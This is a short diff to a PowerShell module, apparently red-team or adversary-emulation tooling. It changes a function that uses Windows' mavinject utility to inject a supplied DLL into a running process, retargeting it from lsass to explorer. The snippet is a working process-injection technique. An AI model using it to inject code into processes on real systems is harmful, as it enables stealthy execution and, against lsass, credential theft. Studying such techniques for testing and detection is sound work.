@@ -345,7 +345,7 @@ function process-injectionDll {
     param (
         [string]$DLLfile
     )
-    $ALPID = (get-process lsass).id
+    $ALPID = (get-process explorer).id
     mavinject $ALPID /INJECTRUNNING $DLLfile
 }
 Export-ModuleMember -Function process-injectionDll 
